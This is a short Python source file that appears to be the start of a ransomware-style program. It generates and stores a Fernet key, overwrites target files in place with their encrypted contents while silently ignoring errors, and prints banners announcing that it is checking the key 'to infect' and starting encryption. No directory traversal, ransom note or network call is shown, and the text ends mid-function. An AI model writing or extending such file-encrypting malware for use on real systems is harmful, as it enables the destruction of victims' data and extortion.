from cryptography.fernet import Fernet
from time  import sleep
from os import system

def keygen():
    key = Fernet.generate_key()
    with open("totem.key","wb") as totem:
        totem.write(key)

def getkey():
    try:
        keyfile = open("totem.key","rb").read()
        return keyfile    
    except:
        return None

def encrypt_file(file, key, silent=False):
    fern = Fernet(key)
    try:
        with open(file,"rb") as target_r:
            target_data = target_r.read()
        data_encrypt = fern.encrypt(target_data)
        with open(file, "wb") as target_w:
            target_w.write(data_encrypt)
    except:
        print()

def print_encryption(silent=False):
    if silent == False:
        print("""
            **************************************
            *|     CHECKING KEY TO INFECT!!!    |*
            **************************************\n""")
        sleep(0.5)
        print("*** KEY CHECKED ***")
        sleep(2)
        system('clear')
        print("""
            **************************************
            *|      STARTING ENCRYPTION!!!      |*
            **************************************\n""")
        sleep(0.5)
        print("*** ENCRYPING FILES ***")
        sleep(2)